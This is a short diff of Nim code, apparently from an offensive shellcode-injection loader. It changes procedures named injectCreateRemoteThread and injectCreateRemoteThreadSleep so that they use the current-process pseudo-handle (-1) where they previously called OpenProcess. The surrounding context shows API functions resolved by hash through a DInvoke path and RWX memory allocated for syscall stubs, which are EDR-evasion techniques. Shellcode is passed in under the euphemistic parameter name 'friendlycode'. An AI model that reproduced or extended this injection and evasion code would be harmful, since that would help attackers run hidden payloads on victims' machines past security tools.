@@ -146,9 +146,7 @@ proc injectCreateRemoteThreadSleep(): void =
 
 
     when defined(DInvoke):
-        let tProcess2 = MyGetCurrentProcessId()
-
-        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        var pHandle2: HANDLE = -1
 
         MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
         let syscallStub_NtOpenP = MyVirtualAllocEx(
@@ -159,8 +157,7 @@ proc injectCreateRemoteThreadSleep(): void =
         PAGE_EXECUTE_READ_WRITE
         )
     else:
-        let tProcess2 = GetCurrentProcessId()
-        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        var pHandle2: HANDLE = -1
 
         let syscallStub_NtOpenP = VirtualAllocEx(
         pHandle2,
@@ -448,9 +445,8 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
     
     when defined(DInvoke):
-        let tProcess2 = MyGetCurrentProcessId()
-
-        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        
+        var pHandle2: HANDLE = -1
 
         MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
         let syscallStub_NtOpenP = MyVirtualAllocEx(
@@ -461,9 +457,8 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
         PAGE_EXECUTE_READ_WRITE
         )
     else:
-        let tProcess2 = GetCurrentProcessId()
 
-        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        var pHandle2: HANDLE = -1
 
         let syscallStub_NtOpenP = VirtualAllocEx(
         pHandle2,
